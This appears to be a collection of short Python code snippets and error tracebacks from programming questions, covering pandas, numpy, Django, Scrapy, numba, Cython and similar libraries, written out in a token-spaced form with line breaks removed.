"import pandas as pdimport numpy as npcols= [ ( yr , m ) for yr in [ 2014,2015 ] for m in [ 7,8,9,10 ] ] df = pd.DataFrame ( np.random.randint ( 1,100 , ( 10,8 ) ) , index=tuple ( 'ABCDEFGHIJ ' ) ) df.columns =pd.MultiIndex.from_tuples ( cols ) print df.head ( ) 2014 2015 7 8 9 10 7 8 9 10A 68 51 6 48 24 3 4 85B 79 75 68 62 19 40 63 45C 60 15 32 32 37 95 56 38D 4 54 81 50 13 64 65 13E 78 21 84 1 83 18 39 57 # This does not work as expectedprint df.loc ( axis=1 ) [ ( 2014,9 ) : ( 2015,8 ) ] AssertionError : Start slice bound is non-scalar # but an arbitrary transpose and changing axis works ! df = df.Tprint df.loc ( axis=0 ) [ ( 2014,9 ) : ( 2015,8 ) ] A B C D E F G H I J2014 9 6 68 32 81 84 60 83 39 94 93 10 48 62 32 50 1 84 18 14 92 332015 7 24 19 37 13 83 69 31 91 69 90 8 3 40 95 64 18 8 32 93 16 25 df = df.loc ( axis=0 ) [ ( 2014,9 ) : ( 2015,8 ) ] df = df.Tprint df 2014 2015 9 10 7 8 A 64 98 99 87B 43 36 22 84C 32 78 86 66D 67 8 34 73E 83 54 96 33F 18 83 36 71G 13 25 76 8H 69 4 99 84I 3 52 50 62J 67 60 9 49"
"def query ( self , query ) : lock = QMutexLocker ( self.mutex ) reply = self.conn.query ( query ) if ( re.search ( `` error '' , reply ) ! = None ) : raise GeneralError ( `` Query error '' ) # more code ... return reply"
easy_install sklearn-pandas
"input = [ 'this ' , 'is ' , ' a ' , 'list ' ] output = [ ( 'this ' , 'is ' ) , ( ' a ' , 'list ' ) ]"
"import numpyimport matplotlib.pyplot as pltplt.plot ( xdata = numpy.array ( [ 1 ] ) , ydata = numpy.array ( 1 ) , color = 'red ' , marker = ' o ' ) > In [ 21 ] : import numpy > In [ 22 ] : import matplotlib.pyplot as plt > In [ 23 ] : plt.plot ( xdata = numpy.array ( [ 1 ] ) , ydata = numpy.array ( 1 ) , color = 'red ' , marker = ' o ' ) > Out [ 23 ] : [ ] > In [ 24 ] : plt.plot ( [ 1 ] , [ 1 ] , color = 'red ' , marker = ' o ' ) > Out [ 24 ] : [ < matplotlib.lines.Line2D at 0x108036890 > ] > In [ 25 ] : plt.plot ( 1 , 1 , color = 'red ' , marker = ' o ' ) > Out [ 25 ] : [ < matplotlib.lines.Line2D at 0x1041024d0 > ]"
import dateutil.parser as parserx = '10/84'date = ( parser.parse ( x ) ) print ( date.isoformat ( ) )
"class MyClass ( object ) : `` ' > > > m = MyClass ( ) > > > print m.x 1 > > > class A ( MyClass ) : > > > def __init__ ( self ) : > > > super ( A , self ) .__init__ ( ) > > > > > > a = A ( ) > > > print a.x 1 `` ' def __init__ ( self ) : self.x = 1if __name__ == `` __main__ '' : import doctest doctest.testmod ( ) Failed example : class A ( MyClass ) : Exception raised : Traceback ( most recent call last ) : File `` C : \Python27\lib\doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs File `` < doctest __main__.MyClass [ 2 ] > '' , line 1 class A ( MyClass ) : ^SyntaxError : unexpected EOF while parsing"
@ jit @ jit ( nopython=True ) Failed at nopython ( nopython frontend ) Untyped global name 'transpose '
"product = Product.objects.get ( pk=4 ) template = loader.get_template ( 'weekly-email.html ' ) user = User.objects.get ( pk=1 ) body = template.render ( Context ( { 'user ' : user , 'product ' : product , } ) ) Traceback ( most recent call last ) : File `` < console > '' , line 1 , in < module > File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/backends/django.py '' , line 74 , in render return self.template.render ( context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 209 , in render return self._render ( context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 201 , in _render return self.nodelist.render ( context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 903 , in render bit = self.render_node ( node , context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 917 , in render_node return node.render ( context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 963 , in render return render_value_in_context ( output , context ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/template/base.py '' , line 939 , in render_value_in_context value = localize ( value , use_l10n=context.use_l10n ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/formats.py '' , line 181 , in localize return number_format ( value , use_l10n=use_l10n ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/formats.py '' , line 162 , in number_format get_format ( 'DECIMAL_SEPARATOR ' , lang , use_l10n=use_l10n ) , File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/formats.py '' , line 110 , in get_format for module in get_format_modules ( lang ) : File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/formats.py '' , line 82 , in get_format_modules modules = _format_modules_cache.setdefault ( lang , list ( iter_format_modules ( lang , settings.FORMAT_MODULE_PATH ) ) ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/formats.py '' , line 51 , in iter_format_modules if not check_for_language ( lang ) : File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/translation/__init__.py '' , line 181 , in check_for_language return _trans.check_for_language ( lang_code ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/functools.py '' , line 472 , in wrapper result = user_function ( *args , **kwds ) File `` /Users/croberts/.virtualenvs/testproj/lib/python3.4/site-packages/django/utils/translation/trans_real.py '' , line 409 , in check_for_language if not language_code_re.search ( lang_code ) : TypeError : expected string or buffer # Build paths inside the project like this : os.path.join ( BASE_DIR , ... ) import osDEBUG = TrueBASE_DIR = os.path.dirname ( os.path.dirname ( os.path.abspath ( __file__ ) ) ) SECRET_KEY = 'SECRET'ALLOWED_HOSTS = [ ] AUTH_USER_MODEL = 'crunch.User'STATICFILES_DIRS = ( '/Users/croberts/testproj/static/ ' , ) # Application definitionINSTALLED_APPS = ( 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'crunch ' , 'emailmanager ' , ) MIDDLEWARE_CLASSES = ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.auth.middleware.SessionAuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , 'django.middleware.security.SecurityMiddleware ' , ) ROOT_URLCONF = 'testproj.urls'WSGI_APPLICATION = 'testproj.wsgi.application'DATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.sqlite3 ' , 'NAME ' : os.path.join ( BASE_DIR , 'database ' ) , } } LANGUAGE_CODE = 'en-us'TIME_ZONE = 'MST'USE_I18N = TrueUSE_L10N = TrueUSE_TZ = FalseSTATIC_URL = '/static/'MEDIA_ROOT = BASE_DIR+'/media/'MEDIA_URL = '/media/ '"
"print f ( [ 0.2 , 0.3,0.1,0.4 ] ) [ 0.2,0.5,0.6,1.0 ] def f ( probabilities ) : sum = 0 returnList = [ ] for count in probabilities : sum +=count returnList = returnList + [ sum ] return returnList"
"def permutation_recursion ( numbers , sol ) : if not numbers : print `` this is a permutation '' , sol for i in range ( len ( numbers ) ) : permutation_recursion ( numbers [ : i ] + numbers [ i+1 : ] , sol + [ numbers [ i ] ] ) def get_permutations ( numbers ) : permutation_recursion ( numbers , list ( ) ) if __name__ == `` __main__ '' : get_permutations ( [ 1,2,3 ] ) import java.util.ArrayList ; import java.util.Arrays ; class rec { static void permutation_recursion ( ArrayList < Integer > numbers , ArrayList < Integer > sol ) { if ( numbers.size ( ) == 0 ) System.out.println ( `` permutation= '' +Arrays.toString ( sol.toArray ( ) ) ) ; for ( int i=0 ; i < numbers.size ( ) ; i++ ) { int n = numbers.get ( i ) ; ArrayList < Integer > remaining = new ArrayList < Integer > ( numbers ) ; remaining.remove ( i ) ; ArrayList < Integer > sol_rec = new ArrayList < Integer > ( sol ) ; sol_rec.add ( n ) ; permutation_recursion ( remaining , sol_rec ) ; } } static void get_permutation ( ArrayList < Integer > numbers ) { permutation_recursion ( numbers , new ArrayList < Integer > ( ) ) ; } public static void main ( String args [ ] ) { Integer [ ] numbers = { 1,2,3 } ; get_permutation ( new ArrayList < Integer > ( Arrays.asList ( numbers ) ) ) ; } } ArrayList < Integer > remaining = new ArrayList < Integer > ( numbers ) ; remaining.remove ( i ) ; ArrayList < Integer > sol_rec = new ArrayList < Integer > ( sol ) ; sol_rec.add ( n ) ;"
"import pandasimport numpyfrom sklearn_pandas import DataFrameMapperfrom sklearn_pandas import cross_val_scorefrom sklearn.pipeline import Pipelinefrom sklearn.grid_search import GridSearchCVfrom sklearn.base import TransformerMixinfrom sklearn.preprocessing import LabelBinarizerfrom sklearn.ensemble import RandomForestClassifierimport sklearn_pandasfrom sklearn.preprocessing import MinMaxScalerdf = pandas.DataFrame ( { `` Letter '' : [ `` a '' , '' b '' , '' c '' , '' d '' , '' a '' , '' b '' , '' c '' , '' d '' , '' a '' , '' b '' , '' c '' , '' d '' , '' a '' , '' b '' , '' c '' , '' d '' ] , `` Number '' : [ 1,2,3,4,1,2,3,4,1,2,3,4,1,2,3,4 ] , `` Label '' : [ `` G '' , '' G '' , '' B '' , '' B '' , '' G '' , '' G '' , '' B '' , '' B '' , '' G '' , '' G '' , '' B '' , '' B '' , '' G '' , '' G '' , '' B '' , '' B '' ] } ) class MyTransformer ( TransformerMixin ) : def transform ( self , x , **transform_args ) : x [ `` Number '' ] = x [ `` Number '' ] .apply ( lambda row : row*2 ) return x def fit ( self , x , y=None , **fit_args ) : return selfx_train = dfy_train = x_train.pop ( `` Label '' ) mapper = DataFrameMapper ( [ ( `` Number '' , MinMaxScaler ( ) ) , ( `` Letter '' , LabelBinarizer ( ) ) , ] ) pipe = Pipeline ( [ ( `` custom '' , MyTransformer ( ) ) , ( `` mapper '' , mapper ) , ( `` classifier '' , RandomForestClassifier ( ) ) , ] ) param_grid = { `` classifier__min_samples_split '' : [ 10,20 ] , `` classifier__n_estimators '' : [ 2,3,4 ] } model_grid = sklearn_pandas.GridSearchCV ( pipe , param_grid , verbose=2 , scoring= '' accuracy '' ) model_grid.fit ( x_train , y_train ) list indices must be integers , not str"
"d1 = pd.DataFrame ( { 'i1 ' : [ 1 , 2 , 2 ] , 'i2 ' : [ 1 , 1 , 2 ] , ' a ' : [ 10,20,30 ] } ) .set_index ( [ 'i1 ' , 'i2 ' ] ) d2 = pd.DataFrame ( { 'i1 ' : [ 3 , 3 ] , 'i2 ' : [ 1 , 2 ] , ' b ' : [ 40 , 50 ] } ) .set_index ( [ 'i1 ' , 'i2 ' ] ) d1.join ( d2 , how='inner ' ) Exception : Can not infer number of levels from empty list"
"import numpy as npa = np.array ( [ [ 0.999875 , 0.015836 ] , [ 0.997443 , 0.071463 ] , [ 0.686554 , 0.727078 ] , [ 0.93322 , 0.359305 ] ] ) b = np.array ( [ [ 0.7219 , 0.691997 ] , [ 0.313656 , 0.949537 ] , [ 0.507926 , 0.861401 ] , [ 0.818131 , 0.575031 ] , [ 0.117956 , 0.993019 ] ] ) In [ 441 ] : np.array ( [ np.cross ( av , bv ) for bv in b for av in a ] ) .reshape ( 5 , 4 ) Out [ 441 ] : array ( [ [ 0.680478 , 0.638638 , -0.049784 , 0.386403 ] , [ 0.944451 , 0.924694 , 0.423856 , 0.773429 ] , [ 0.85325 , 0.8229 , 0.222097 , 0.621377 ] , [ 0.562003 , 0.515094 , -0.200055 , 0.242672 ] , [ 0.991027 , 0.982051 , 0.595998 , 0.884323 ] ] ) In [ 438 ] : np.cross ( a , b.T , axisa=1 , axisb=0 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-438-363c0765a7f9 > in < module > ( ) -- -- > 1 np.cross ( a , b.T , axisa=1 , axisb=0 ) D : \users\ae4652t\Python27\lib\site-packages\numpy\core\numeric.p < snipped > 1242 if a.shape [ 0 ] == 2 : 1243 if ( b.shape [ 0 ] == 2 ) : - > 1244 cp = a [ 0 ] *b [ 1 ] - a [ 1 ] *b [ 0 ] 1245 if cp.ndim == 0 : 1246 return cpValueError : operands could not be broadcast together with shapes ( 4 ) ( 5 )"
"import scrapyclass BlackSpider ( scrapy.Spider ) : name = 'Black1 ' def __init__ ( self , allowed_domains= [ ] , start_urls= [ ] , *args , **kwargs ) : super ( BlackSpider , self ) .__init__ ( *args , **kwargs ) self.start_urls = start_urls self.allowed_domains = allowed_domains # For Testing : print start_urls print self.start_urls print allowed_domains print self.allowed_domains def parse ( self , response ) : # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # Insert my parse code here # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # return items import scrapyfrom scrapy.crawler import CrawlerProcessfrom MySpider import BlackSpider # Set my allowed domain ( this will come from DB later ) ad = [ `` example.com '' ] # Set my start urlsd = [ `` http : //example.com/files/subfile/dir1 '' ] # Initialize MySpider with the above allowed domain and start urlMySpider = BlackSpider ( ad , sd ) # Crawl MySpiderprocess = CrawlerProcess ( { 'USER_AGENT ' : 'Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ) ' } ) process.crawl ( MySpider ) process.start ( ) me @ mybox : ~/ $ python RunSpider.py [ 'http : //example.com/files/subfile/dir1 ' ] [ 'http : //example.com/files/subfile/dir1 ' ] [ 'example.com ' ] [ 'example.com ' ] 2016-02-26 16:11:41 [ scrapy ] INFO : Scrapy 1.0.5 started ( bot : scrapybot ) ... 2016-02-26 16:11:41 [ scrapy ] INFO : Overridden settings : { 'USER_AGENT ' : 'Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ) ' } ... [ ] [ ] [ ] [ ] 2016-02-26 16:11:41 [ scrapy ] INFO : Spider opened ... 2016-02-26 16:11:41 [ scrapy ] INFO : Crawled 0 pages ( at 0 pages/min ) , scraped 0 items ( at 0 items/min ) ... 2016-02-26 16:11:41 [ scrapy ] INFO : Closing spider ( finished ) ... 2016-02-26 16:11:41 [ scrapy ] INFO : Spider closed ( finished )"
"Factory ( protocol.ReconnectingClientFactory ) : def clientConnectionFailed ( self , connector , reason ) : ... def clientConnectionLost ( self , connector , reason ) : ..."
"x = [ 1 , 2 , 3 ] y = [ 1 , 2 , 3 ] id ( x ) ! = id ( y ) Trueid ( x ) 11428848id ( y ) 12943768"
a = 10def f ( ) : print ( 1 ) print ( a ) # UnboundLocalError raised here a = 20f ( )
"dists = [ 'alpha ' , 'anglit ' , 'arcsine ' , 'beta ' , 'betaprime ' , 'bradford ' , 'norm ' ] for d in dists : dist = getattr ( scipy.stats , d ) ps = dist.fit ( selected_data ) errors.loc [ d , [ 'D-Value ' , ' P-Value ' ] ] = kstest ( selected.tolist ( ) , d , args=ps ) errors.loc [ d , 'Params ' ] = ps"
temp = input ( ) temp = temp.split ( `` `` ) N = int ( temp [ 0 ] ) K = int ( temp [ 1 ] ) num_array = input ( ) num_array = num_array.split ( `` `` ) diff = 0pairs= 0i = 0while ( i < N ) : num_array [ i ] = int ( num_array [ i ] ) i += 1while ( num_array ! = [ ] ) : j = 0 while ( j < ( len ( num_array ) -1 ) ) : diff = abs ( num_array [ j+1 ] - num_array [ 0 ] ) if ( diff == K ) : pairs += 1 j += 1 del num_array [ 0 ] if ( len ( num_array ) == 1 ) : breakprint ( pairs )
"from django.contrib import messagesclass InputFormView ( FormView ) : template_name = 'entryform.html'form_class = EntryFormdef get_success_url ( self ) : params = { 'department ' : self.request.POST.get ( 'company ' ) , 'person ' : self.request.POST.get ( 'region ' ) } return `` .join ( [ reverse ( 'final ' ) , ' ? ' , urllib.urlencode ( params.items ( ) ) ] ) class FinalView ( ListView ) : context_object_name = 'XXX ' template_name = 'XXX.html ' model = Final def get_queryset ( self ) : form = InputForm ( self.request.GET ) if form.is_valid ( ) : department = form.cleaned_data [ 'department ' ] person = form.cleaned_data [ 'person ' ] if department ! = '' '' and person ! = '' '' : if Final.objects.filter ( department=department , person=person ) .exists ( ) : queryset=Final.objects.filter ( department=department , person=person ) return queryset else : msg= '' no corresponding data exists ! '' form.add_error ( 'department ' , msg ) form.add_error ( 'person ' , msg ) elif department == '' '' and person ! = '' '' : if Final.objects.filter ( person=person ) .exists ( ) : queryset=Final.objects.filter ( person=person ) return queryset else : msg= '' no corresponding data exists ! '' form.add_error ( 'department ' , msg ) form.add_error ( 'person ' , msg ) elif ... ... .. else : # if form not valid messages.error ( request , `` Error '' ) def get_context_data ( self , **kwargs ) : query_set = self.get_queryset ( ) if query_set is not None : context [ `` sales '' ] = self.get_queryset ( ) .aggregate ( Sum ( 'sales ' ) ) < form method= '' post '' > { % csrf_token % } { % csrf_token % } { { formset.management_form } } { { formset.errors } } { { formset.non_field_errors } } { { formset.non_form_errors } } { { form.non_field_errors } } ... ... < ! -- select department -- > < div class= '' field '' > < label > Select department : { { form.department } } { % for department in form.department.choices % } < option value= '' department '' name= `` department '' id= '' id_department '' > { { department } } < /option > { % endfor % } < /label > < /div > ... ... ... .same for person ... .. < ! -- submit -- > < div class= '' button '' id= '' btnShow '' > < input type= '' submit '' value= '' Submit '' / > < /div > < /div > < /form >"
group1-Steve group1-Mark group1-Tom group2-Brett group2-Mick group2-Foo group3-Dan group3-Phil
"lambda x : x == lambda x : x # Truelambda x : 2 * x == lambda y : 2 * y # Truelambda x : 2 * x == lambda x : x * 2 # True or False is fine , but must be stablelambda x : 2 * x == lambda x : x + x # True or False is fine , but must be stable # global variablefields = [ 'id ' , 'name ' ] def my_function ( ) : global fields s1 = sortedset ( key = lambda x : x [ fields [ 0 ] .lower ( ) ] ) # some intervening code here # ... s2 = sortedset ( key = lambda x : x [ fields [ 0 ] .lower ( ) ] )"
"import numpy as npimport numba @ numba.vectorize ( [ `` float32 ( float32 , float32 ) '' ] , target='cuda ' ) def vector_diff_axis0 ( a , b ) : return a + bdef my_diff ( A , axis=0 ) : if ( axis == 0 ) : return vector_diff_axis0 ( A [ 1 : ] , A [ : -1 ] ) if ( axis == 1 ) : return vector_diff_axis0 ( A [ : ,1 : ] , A [ : , : -1 ] ) A = np.matrix ( [ [ 0 , 1 , 2 , 3 , 4 ] , [ 5 , 6 , 7 , 8 , 9 ] , [ 9 , 8 , 7 , 6 , 5 ] , [ 4 , 3 , 2 , 1 , 0 ] , [ 0 , 2 , 4 , 6 , 8 ] ] , dtype='float32 ' ) C = my_diff ( A , axis=1 ) print ( str ( C ) ) TypeError : No matching version . GPU ufunc requires array arguments to have the exact types . This behaves like regular ufunc with casting='no ' ."
"x1 = [ 0. , 13.99576991 , 27.99153981 , 41.98730972 , 55.98307963 , 69.97884954 , 83.97461944 , 97.97038935 , 111.9661593 , 125.9619292 , 139.9576991 , 153.953469 ] y1 = [ 1. , 0.88675318 , 0.67899118 , 0.50012243 , 0.35737022 , 0.27081293 , 0.18486778 , 0.11043095 , 0.08582272 , 0.04946131 , 0.04285015 , 0.02901567 ] x = np.array ( x1 ) y = np.array ( y1 ) # Interpolate the data using a cubic spline to `` new_length '' samplesnew_length = 50new_x = np.linspace ( x.min ( ) , x.max ( ) , new_length ) new_y = sp.interpolate.interp1d ( x , y , kind='cubic ' ) ( new_x )"
"# # Reference 1 http : //stackoverflow.com/questions/19390895/matplotlib-plot-with-variable-line-width # # Reference 2 http : //stackoverflow.com/questions/17240694/python-how-to-plot-one-line-in-different-colorsdef plot_colourline ( x , y , c ) : c = plt.cm.jet ( ( c-np.min ( c ) ) / ( np.max ( c ) -np.min ( c ) ) ) lwidths=1+x [ : -1 ] ax = plt.gca ( ) for i in np.arange ( len ( x ) -1 ) : ax.plot ( [ x [ i ] , x [ i+1 ] ] , [ y [ i ] , y [ i+1 ] ] , c=c [ i ] , linewidth = lwidths [ i ] ) # = lwidths [ i ] ) returnx=np.linspace ( 0,4*math.pi,100 ) y=np.cos ( x ) lwidths=1+x [ : -1 ] fig = plt.figure ( 1 , figsize= ( 5,5 ) ) ax = fig.add_subplot ( 111 ) plot_colourline ( x , y , prop ) ax.set_xlim ( 0,4*math.pi ) ax.set_ylim ( -1.1,1.1 )"
board_length=8 # in inchesboard_length=8*12 # Convert from feet to inches board_length=8board_length_inches=8*12 Fboard_length=8Iboard_length=8*12
"import numpy as npimport scipy.ndimage as ndimageimport matplotlib.pyplot as plt # Sample study area arrayexample_array = np.array ( [ [ 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 ] , [ 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 ] , [ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 ] , [ 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 ] , [ 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 ] , [ 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 ] , [ 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ] ) # Plot example arrayplt.imshow ( example_array , cmap= '' spectral '' , interpolation='nearest ' ) seed_array = np.array ( [ [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 4 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 1 , 1 , 1 , 0 , 0 , 2 , 2 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ] ) # Plot seedsplt.imshow ( seed_array , cmap= '' spectral '' , interpolation='nearest ' ) desired_output = np.array ( [ [ 0 , 0 , 0 , 0 , 4 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 4 , 4 , 4 , 0 , 0 , 0 , 3 , 3 , 3 ] , [ 0 , 0 , 0 , 0 , 4 , 4 , 0 , 0 , 0 , 3 , 3 , 3 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 0 , 3 , 0 ] , [ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 3 ] , [ 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 2 , 2 , 3 , 3 ] , [ 1 , 1 , 1 , 1 , 0 , 0 , 2 , 2 , 2 , 0 , 0 , 3 ] , [ 1 , 1 , 1 , 1 , 1 , 2 , 2 , 2 , 2 , 0 , 0 , 0 ] , [ 1 , 1 , 1 , 1 , 0 , 0 , 2 , 2 , 2 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ] ) # Plot desired outputplt.imshow ( desired_output , cmap= '' spectral '' , interpolation='nearest ' )"
"lst= [ ' 1 ' , 'err ' , '-1 ' , ' ' , '155 ' ] lst1=int ( lst ) for i in lst1 : if i < 0 : print i else : continueTraceback ( most recent call last ) : File `` C : /Users/Dev/Documents/Assignment-2/test-2.py '' , line 22 , in < module > c3=int ( row [ 3 ] ) ValueError : invalid literal for int ( ) with base 10 : 'err ' > > >"
instance = { 'one ' : 1 } instance.values ( ) == instance.values ( ) # Returns Falseinstance.keys ( ) == instance.keys ( ) # Returns True
def f ( self ) : print self.nameclass A : z=f name= '' A '' class B : z=f name = `` B '' print a.z ( ) > > > A
"class EditFileForm ( Form ) : title = StringField ( 'title ' ) shared = BooleanField ( 'shared ' ) fileID = IntegerField ( 'fileID ' ) userID = IntegerField ( 'userID ' ) data = MultiDict ( mapping=request.json ) print ( data ) > > MultiDict ( [ ( u'shared ' , False ) , ( u'title ' , u'File5 ' ) , ( u'userID ' , 1 ) , ( u'fileID ' , 16 ) ] ) print ( form.shared.raw_data ) [ False ] print ( form.shared.data ) True"
"requires_dist : [ `` bcrypt ; extra == 'bcrypt ' '' , `` argon2-cffi ( > =16.1.0 ) ; extra == 'argon2 ' '' ]"
"engine = create_engine ( 'ORACLE CONNECTION STRING ' ) metadata = MetaData ( ) students = Table ( 'students ' , metadata , autoload=True , autoload_with=engine ) results = engine.execute ( 'SELECT * FROM students ' ) for r in results : print ( r ) metadata.reflect ( bind=engine ) print ( metadata.tables )"
"X1 = np.array ( [ [ -0.047 , -0.113 , 0.155 , 0.001 ] , [ 0.039 , 0.254 , 0.054 , 0.201 ] ] , dtype=float ) In : X1Out : array ( [ [ -0.047 , -0.113 , 0.155 , 0.001 ] , [ 0.039 , 0.254 , 0.054 , 0.201 ] ] ) In : X1.shapeOut : ( 2,4 ) X2 = X1.reshape ( ( 2 , -1 , 1 ) ) In : X2Out : array ( [ [ [ -0.047 ] , [ -0.113 ] , [ 0.155 ] , [ 0.001 ] ] , [ 0.039 ] , [ 0.254 ] , [ 0.054 ] , [ 0.201 ] ] ] ) In : X2.shapeOut : ( 2 , 4 , 1 )"
import osdef folder_size ( path ) : total = 0 for entry in os.scandir ( path ) : if entry.is_file ( ) : total += entry.stat ( ) .st_size elif entry.is_dir ( ) : total += folder_size ( entry.path ) return totalprint ( folder_size ( `` /media '' ) )
"@ click.command ( ) @ click.option ( ' -- foo ' , is_flag=True ) @ click.option ( ' -- bar ' , is_flag=True ) @ click.option ( ' -- unique-flag-1 ' , is_flag=True ) def command_one ( ) : pass @ click.command ( ) @ click.option ( ' -- foo ' , is_flag=True ) @ click.option ( ' -- bar ' , is_flag=True ) @ click.option ( ' -- unique-flag-2 ' , is_flag=True ) def command_two ( ) : pass"
"[ [ 0 ] ] [ [ 2 , 1 ] , [ 2 , 0 ] , [ 3 , 1 ] , [ 1 , 0 ] ] [ [ 1 ] , [ 0 ] ] [ [ 2 ] ] # 2 is more than N=1 ( total number of sublists ) [ [ 0 , 1 ] , [ 2 , 0 ] ] # 2 is equal to N=2 ( total number of sublists ) from hypothesis import givenfrom hypothesis.strategies import lists , integers @ given ( lists ( lists ( integers ( min_value=0 , max_value=5 ) , min_size=1 , max_size=5 ) , min_size=1 , max_size=50 ) ) def test ( l ) : # ... from hypothesis import givenfrom hypothesis.strategies import lists , integers @ given ( integers ( min_value=0 , max_value=5 ) .flatmap ( lambda n : lists ( lists ( integers ( min_value=1 , max_value=5 ) , min_size=n , max_size=n ) , min_size=1 , max_size=50 ) ) ) def test ( l ) : # ..."
"try : shutil.move ( old_path , new_path ) except IOError as e : if e.errno ! = 2 : raise e"
"import cython % load_ext Cython % % cythoncdef extern from `` spam.c '' : void order_spam ( int tons ) // spam.c # include < stdio.h > static void order_spam ( int tons ) { printf ( `` Ordered % i tons of spam ! \n '' , tons ) ; } CompileError Traceback ( most recent call last ) < ipython-input-13-8bb733557977 > in < module > ( ) -- -- > 1 get_ipython ( ) .run_cell_magic ( u'cython ' , u '' , u'\ncdef extern from `` spam.c '' : \n void order_spam ( int tons ) ' ) /Users/danielacker/anaconda2/lib/python2.7/site-packages/IPython/core/interactiveshell.pyc in run_cell_magic ( self , magic_name , line , cell ) 2118 magic_arg_s = self.var_expand ( line , stack_depth ) 2119 with self.builtin_trap : - > 2120 result = fn ( magic_arg_s , cell ) 2121 return result 2122 < decorator-gen-126 > in cython ( self , line , cell ) /Users/danielacker/anaconda2/lib/python2.7/site-packages/IPython/core/magic.pyc in < lambda > ( f , *a , **k ) 191 # but it 's overkill for just that one bit of state . 192 def magic_deco ( arg ) : -- > 193 call = lambda f , *a , **k : f ( *a , **k ) 194 195 if callable ( arg ) : /Users/danielacker/anaconda2/lib/python2.7/site-packages/Cython/Build/IpythonMagic.py in cython ( self , line , cell ) 276 build_extension.build_temp = os.path.dirname ( pyx_file ) 277 build_extension.build_lib = lib_dir -- > 278 build_extension.run ( ) 279 self._code_cache [ 